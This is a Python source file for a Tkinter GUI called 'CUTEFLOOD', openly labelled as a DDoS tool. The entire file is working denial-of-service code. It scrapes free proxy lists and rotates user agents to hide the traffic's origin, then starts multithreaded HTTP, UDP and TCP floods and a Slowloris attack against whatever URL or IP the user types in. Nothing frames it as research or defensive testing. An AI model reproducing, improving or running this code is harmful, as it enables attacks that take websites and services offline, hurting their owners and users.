import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import requests
import random
import socket
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup

headers_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    # Add more user-agents for smart rotation
]

def get_proxies():
    proxies = []
    try:
        res = requests.get("https://free-proxy-list.net/")
        soup = BeautifulSoup(res.text, "html.parser")
        for row in soup.find("table", id="proxylisttable").tbody.find_all("tr"):
            cols = row.find_all("td")
            ip, port, https = cols[0].text, cols[1].text, cols[6].text
            if https == "yes":
                proxies.append(f"http://{ip}:{port}")
    except:
        pass
    return proxies

def http_flood(target, duration, proxy_list):
    parsed = urlparse(target)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            proxy = {"http": random.choice(proxy_list)}
            headers = {"User-Agent": random.choice(headers_list)}
            requests.get(target, headers=headers, proxies=proxy, timeout=3)
        except:
            continue

def udp_flood(ip, port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while time.time() < end_time:
        sock.sendto(bytes_data, (ip, port))

def tcp_flood(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket()
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
            sock.close()
        except:
            continue

def slowloris(ip, port, duration):
    end_time = time.time() + duration
    sock_list = []
    for _ in range(100):
        try:
            s = socket.socket()
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            sock_list.append(s)
        except:
            pass
    while time.time() < end_time:
        for s in sock_list:
            try:
                s.send("X-a: b\r\n".encode())
            except:
                sock_list.remove(s)

def start_attack(method, target, port, duration, threads):
    proxies = get_proxies() if method == "HTTP Flood" else []
    for _ in range(threads):
        if method == "HTTP Flood":
            t = threading.Thread(target=http_flood, args=(target, duration, proxies))
        elif method == "UDP Flood":
            t = threading.Thread(target=udp_flood, args=(target, port, duration))
        elif method == "TCP Flood":
            t = threading.Thread(target=tcp_flood, args=(target, port, duration))
        elif method == "Slowloris":
            t = threading.Thread(target=slowloris, args=(target, port, duration))
        t.start()

def launch():
    target = url_entry.get()
    method = method_var.get()
    port = int(port_entry.get()) if port_entry.get() else 80
    duration = int(duration_entry.get())
    threads = int(threads_entry.get())
    
    if not target or not duration:
        messagebox.showerror("Error", "Please fill all fields!")
        return

    threading.Thread(target=start_attack, args=(method, target, port, duration, threads)).start()
    messagebox.showinfo("DDoS", f"Started {method} attack on {target}")

# GUI
root = tk.Tk()
root.title("CUTEFLOOD GUI - DDoS Cant1k Edition")
root.geometry("500x400")
root.configure(bg="#1e1e2f")

style = {"bg": "#1e1e2f", "fg": "#f0f0f0", "font": ("Arial", 10)}

tk.Label(root, text="Target URL / IP:", **style).pack(pady=5)
url_entry = tk.Entry(root, width=50)
url_entry.pack()

method_var = tk.StringVar(root)
method_var.set("HTTP Flood")
tk.Label(root, text="Method:", **style).pack(pady=5)
tk.OptionMenu(root, method_var, "HTTP Flood", "TCP Flood", "UDP Flood", "Slowloris").pack()

tk.Label(root, text="Port:", **style).pack(pady=5)
port_entry = tk.Entry(root)
port_entry.insert(0, "80")
port_entry.pack()

tk.Label(root, text="Duration (seconds):", **style).pack(pady=5)
duration_entry = tk.Entry(root)
duration_entry.pack()

tk.Label(root, text="Threads:", **style).pack(pady=5)
threads_entry = tk.Entry(root)
threads_entry.insert(0, "50")
threads_entry.pack()

tk.Button(root, text="Start Attack", command=launch, bg="#ff5555", fg="white").pack(pady=20)

root.mainloop()
